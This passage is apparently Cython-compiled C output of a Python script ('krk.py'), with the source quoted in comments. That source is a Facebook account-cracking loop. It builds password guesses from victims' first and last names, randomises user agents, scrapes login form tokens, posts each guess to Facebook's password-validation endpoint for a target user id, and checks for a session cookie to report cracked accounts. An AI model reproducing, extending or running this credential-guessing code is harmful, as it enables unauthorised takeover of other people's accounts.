          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        }
        __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_replace); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 357, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_15))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_15);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_15, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_3, __pyx_n_s_Last, __pyx_v_last};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_7, 2+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 357, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        }
        __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_replace); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 357, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_15))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_15);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_15, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_n_s_first, __pyx_v_ps};
          __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_7, 2+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 357, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        }
        __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_replace); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 357, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_15))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_15);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_15, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_1, __pyx_n_s_last, __pyx_v_ps2};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_7, 2+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 357, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_pas, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":358
 *                 for fikr in passlist:
 *                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
 *                         ua=random.choice(ugen)             # <<<<<<<<<<<<<<
 *                         head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 *                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_random); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 358, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 358, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_ugen); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 358, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_t_15};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 358, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":359
 *                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
 *                         ua=random.choice(ugen)
 *                         head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}             # <<<<<<<<<<<<<<
 *                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 *                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 */
        __pyx_t_4 = __Pyx_PyDict_NewPresized(16); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 359, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_Host, __pyx_kp_s_p_facebook_com) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_viewport_width, __pyx_kp_s_980) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_ch_ua, __pyx_kp_s_Not_A_Brand_v_99_Chromium_v_100) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_ch_ua_mobile, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_ch_ua_platform, __pyx_n_s_Android) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_ch_prefers_color_scheme, __pyx_n_s_light) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_dnt, __pyx_kp_s_1) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_site, __pyx_n_s_none) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_mode, __pyx_n_s_navigate) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_user, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_sec_fetch_dest, __pyx_n_s_document) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate_br) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_s_accept_language, __pyx_kp_s_en_US_en_q_0_9) < 0) __PYX_ERR(0, 359, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_head, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":360
 *                         ua=random.choice(ugen)
 *                         head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 *                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')             # <<<<<<<<<<<<<<
 *                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 *                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 */
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_session, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 360, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_15 = PyTuple_New(3); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 360, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_17 = 0;
        __pyx_t_18 = 127;
        __Pyx_INCREF(__pyx_kp_u_https_p_facebook_com_login_devic);
        __pyx_t_17 += 56;
        __Pyx_GIVEREF(__pyx_kp_u_https_p_facebook_com_login_devic);
        PyTuple_SET_ITEM(__pyx_t_15, 0, __pyx_kp_u_https_p_facebook_com_login_devic);
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_ids, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 360, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_18;
        __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_15, 1, __pyx_t_6);
        __pyx_t_6 = 0;
        __Pyx_INCREF(__pyx_kp_u_flow_login_no_pin_refsrc_deprec);
        __pyx_t_17 += 41;
        __Pyx_GIVEREF(__pyx_kp_u_flow_login_no_pin_refsrc_deprec);
        PyTuple_SET_ITEM(__pyx_t_15, 2, __pyx_kp_u_flow_login_no_pin_refsrc_deprec);
        __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_15, 3, __pyx_t_17, __pyx_t_18); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 360, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        __pyx_t_15 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_15)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_15);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_15, __pyx_t_6};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 360, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_getlog, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":361
 *                         head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 *                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 *                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}             # <<<<<<<<<<<<<<
 *                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 *                         Sabir=session.cookies.get_dict().keys()
 */
        __pyx_t_4 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_re); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_search); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_v_getlog, __pyx_n_s_text); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_16 = __Pyx_PyObject_Str(__pyx_t_15); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        __pyx_t_15 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_15)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_15);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_15, __pyx_kp_s_name_lsd_value, __pyx_t_16};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_7, 2+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 361, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_group); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_int_1};
          __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 361, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_lsd, __pyx_t_1) < 0) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_re); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_search); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_getlog, __pyx_n_s_text); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_15 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_kp_s_name_jazoest_value, __pyx_t_15};
          __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_7, 2+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 361, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        }
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_group); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_int_1};
          __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_7, 1+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 361, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        }
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_jazoest, __pyx_t_1) < 0) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_uid, __pyx_v_ids) < 0) __PYX_ERR(0, 361, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_next, __pyx_kp_s_https_free_facebook_com_login_sa) < 0) __PYX_ERR(0, 361, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_flow, __pyx_n_s_login_no_pin) < 0) __PYX_ERR(0, 361, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_pass, __pyx_v_pas) < 0) __PYX_ERR(0, 361, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_idpass, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":362
 *                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 *                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 *                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)             # <<<<<<<<<<<<<<
 *                         Sabir=session.cookies.get_dict().keys()
 *                         if "c_user" in Sabir:
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_session, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 362, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 362, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_data, __pyx_v_idpass) < 0) __PYX_ERR(0, 362, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_allow_redirects, Py_False) < 0) __PYX_ERR(0, 362, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_v_head) < 0) __PYX_ERR(0, 362, __pyx_L3_error)
        __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__66, __pyx_t_1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 362, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF_SET(__pyx_v_complete, __pyx_t_16);
        __pyx_t_16 = 0;

        /* "krk.py":363
 *                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 *                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 *                         Sabir=session.cookies.get_dict().keys()             # <<<<<<<<<<<<<<
 *                         if "c_user" in Sabir:
 *                                 print('\r\r\033[1;32m [ZEA-OK] %s | %s'%(ids,pas))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_session, __pyx_n_s_cookies); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 363, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 363, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_7 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_7 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_4, };
          __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 363, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
